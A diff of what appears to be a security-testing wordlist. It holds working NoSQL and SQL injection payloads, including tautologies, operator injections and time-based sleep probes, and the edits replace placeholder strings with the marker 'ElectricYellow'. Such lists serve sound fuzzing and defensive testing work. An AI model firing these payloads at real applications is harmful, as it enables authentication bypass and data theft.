@@ -34,7 +34,7 @@
 ?
 |
 |
-' } ], $comment:'successful MongoDB injection'
+' } ], $comment:'ElectricYellow'
 {$gt: ''}
 [$ne]=1
 { $ne: 1 }
@@ -929,9 +929,9 @@ or SLEEP(5)='
 ) or sleep(__TIME__)='
 )) or sleep(__TIME__)="""
 )) or sleep(__TIME__)='
-' or 'something' like 'some%'
- or 'something' = 'some'+'thing'
-' or 'something' = 'some'+'thing'
+' or 'ElectricYellow' like 'Electric%'
+ or 'ElectricYellow' = 'Electric'+'Yellow'
+' or 'ElectricYellow' = 'Electric'+'Yellow'
  or 'text' = n'text'
 ' or 'text' = n'text'
  or 'text' > 't'
@@ -940,8 +940,8 @@ or SLEEP(5)='
 ' or uid like '%
 ' or uname like '%
 ' or uname like '%
- or 'unusual' = 'unusual'
-' or 'unusual' = 'unusual'
+ or 'ElectricYellow' = 'ElectricYellow'
+' or 'ElectricYellow' = 'ElectricYellow'
 ' or userid like '%
 ' or userid like '%
 ' or user like '%
@@ -951,8 +951,8 @@ or SLEEP(5)='
 ' or username like '%
  or username like char(37);
 ' or username like char(37);
- or 'whatever' in ('whatever')
-' or 'whatever' in ('whatever')
+ or 'ElectricYellow' in ('ElectricYellow')
+' or 'ElectricYellow' in ('ElectricYellow')
  OR x=x
  OR x=x#
  OR x=x-- 
